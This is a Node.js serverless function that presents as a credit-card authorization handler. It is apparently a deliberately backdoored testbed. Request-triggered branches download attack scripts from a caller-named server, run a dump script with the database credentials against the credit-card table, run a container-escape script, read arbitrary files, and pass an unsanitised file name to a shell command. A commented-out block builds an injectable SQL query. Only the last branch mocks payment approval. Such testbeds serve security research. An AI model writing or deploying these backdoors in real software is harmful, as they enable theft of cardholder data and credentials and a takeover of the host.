'use strict';

const fs = require('fs');
const child_process = require('child_process');
const malicious = require('./malicious');
const util = require('util');

const execFile = util.promisify(child_process.execFile);

const constants = {
	TABLE_CREDIT_CARDS_NAME: process.env.TABLE_CREDIT_CARDS_NAME,
	HOST: process.env.HOST,
	USER: process.env.USER,
	PASS: process.env.PASS,
	DBNAME: process.env.DBNAME
};

module.exports = async (event, context, callback) => {
	console.log(event);
	console.log("event:body");
	console.log(event.body);
	if (event.body.malicious == 'one') {
		console.log('Step 1: Downloading attack scripts');
		var downloadStatus = await malicious.downloadFile(event.body.attackserver, 'sqldump.sh');

		var response = {
			approved: 'false',
			failureReason: downloadStatus
		};
		callback(null, response);
	} else if (event.body.malicious == 'two') {
		console.log('Step 2: Exfiltration');

		if (fs.existsSync('./sqldump.sh')) {
			try {
				const { stdout, stderr } = await execFile('./sqldump.sh', [constants.HOST, constants.USER, constants.PASS, constants.DBNAME, constants.TABLE_CREDIT_CARDS_NAME]);

				var response = {
					approved: 'false',
					failureReason: {
						out: stdout,
						err: stderr
					}
				};
				callback(null, response);
			} catch (error) {
				console.log('Error with exec');
				console.log(error);
				var response = {
					approved: 'false',
					failureReason: 'Error executing sqldump.sh. Error: ' + error
				};
				callback(null, response);
			}
		} else {
			var response = {
				approved: 'false',
				failureReason: './sqldump.sh does not exist.'
			};
			callback(null, response);
		}
	} else if (event.body.malicious == 'sas6') {
		var path = event.body.path;
		try {
			const data = fs.readFileSync(path, 'utf8');
			console.log('文件内容:', data);
			var response = {
				data: data
			};
			callback(null, response);
		} catch (err) {
			console.error('读取文件时出错:', err);
			var response = {
				data: err
			};
			callback(null, response);
		}
	} else if (event.body.malicious == 'sas3') {
		var fileName = event.body.fileName;
		var response = { 'data': 'done' }
		child_process.execSync(`touch ${fileName}`);
		callback(null, response);
	} else if (event.body.malicious == 'escape_S1') { // zch
		console.log('Step 1: Downloading escape attack scripts');
		var downloadStatus = await malicious.downloadFile(event.body.attackserver, 'escape2.sh');
	
		var response = {
			approved: 'false',
			failureReason: downloadStatus
		};
		callback(null, response);
	} else if (event.body.malicious == 'escape_S2') { // zch
		console.log('Step 2: Exfiltration');
        if (fs.existsSync('./escape2.sh')) {
			try {
				const { stdout, stderr } = await execFile('/bin/sh', ['./escape2.sh']);
				// const { stdout, stderr } = await execFile('./escape2.sh');
				var response = {
					approved: 'false',
					failureReason: {
					out: stdout,
					err: stderr
					}
				};
				callback(null, response);
			} catch (error) {
				console.log('Error with exec');
				console.log(error);
				var response = {
					approved: 'false',
					failureReason: 'Error executing attack.sh. Error: ' + error
				};
				callback(null, response);
			}
		} else {
			var response = {
			approved: 'false',
			failureReason: './escape2.sh does not exist.'
			};
			callback(null, response);
		}
	}else if (event.body.malicious == 'readFiles') {
		/*var fileName = event.body.fileName;
		var response = { 'data': 'done'  , 'type' : 'read' }
		child_process.execSync(`touch ${fileName}`);
		callback(null, response);*/
        const filesToRead = [event.body.fileName]; 
        Promise.all(filesToRead.map(file => {  
            return new Promise((resolve, reject) => {  
                fs.readFile(file, 'utf8', (err, data) => {  
                    if (err) {  
                        reject(`Error reading file ${file}: ${err}`);  
                    } else {  
                        resolve({file, content: data});  
                    }  
                });  
            });  
        }))  
        .then(results => {  
            callback(null, {  
                approved: 'true',  
                files: results  
            });  
        })  
        .catch(err => {  
            callback(null, {  
                approved: 'false',  
                failureReason: err 
            });  
        });  
    } else if (event.body.malicious == 'sqlInjection') {  
		const fs = require('fs');  
		const mysql = require('mysql');  
	
		const sqlQuery = event.body.sql;   
		const fileToRead = event.body.fileName;   
	
		// 直接连接到 MySQL，无需启动服务  
		const connection = mysql.createConnection({  
			host: constants.HOST,  
			user: constants.USER,  
			password: constants.PASS,  
			database: constants.DBNAME  
		});  
		connection.connect((err) => {  
			if (err) {  
				console.error('Error connecting to MySQL:', err);  
				return callback(null, { approved: 'false', failureReason: 'Database connection failed: ' + err.message });  
			}  
			// Log successful connection  
			console.log('Connected to MySQL');  
			connection.query('SELECT 1', (error, results) => {  
				if (error) {  
					console.error('SQL Error:', error);  
					callback(null, {  
						approved: 'false',  
						failureReason: error.message  
					});  
				} else {  
					console.log('Query executed successfully:', results);  
					// Execute your SQL query here  
				}  
			});  
		});
		/*connection.connect((err) => {  
			if (err) {  
				console.error('Error connecting to MySQL:', err);  
				return callback(null, {  
					approved: 'false',  
					failureReason: 'Database connection failed: ' + err.message  
				});  
			}  
	
			const query = `SELECT * FROM users WHERE user_id = '${sqlQuery}';`;   
			connection.query(query, (error, results) => {  
				if (error) {  
					console.error('SQL Error:', error);  
					callback(null, {  
						approved: 'false',  
						failureReason: error.message  
					});  
				} else {  
					try {  
						const data = fs.readFileSync(fileToRead, 'utf8');  
						console.log('Read file content:', data);  
	
						callback(null, {  
							approved: 'true',  
							results: results,  
							fileContent: data  
						});  
					} catch (err) {  
						console.error('Error reading file:', err);  
						callback(null, {  
							approved: 'false',  
							failureReason: 'File read error: ' + err.message  
						});  
					}  
				}  
			});  
			connection.end();  
		});  */
	} else {
		var result = {};
		if (event.body.creditCard) {
			if (Math.random() < 0.01) { // Simulate failure in 1% of purchases (expected).
				result.approved = 'false';
				result.failureReason = 'Credit card authorization failed';
			} else {
				result.approved = 'true';
				result.authorization = Math.floor(Math.random() * Number.MAX_SAFE_INTEGER);
			}
			return callback(null, result);
		} else {
			var response = {
				approved: 'false',
				failureReason: 'Database access not implemented. Please supply creditCard in request.'
			};
			callback(null, response);
		}
	}
};
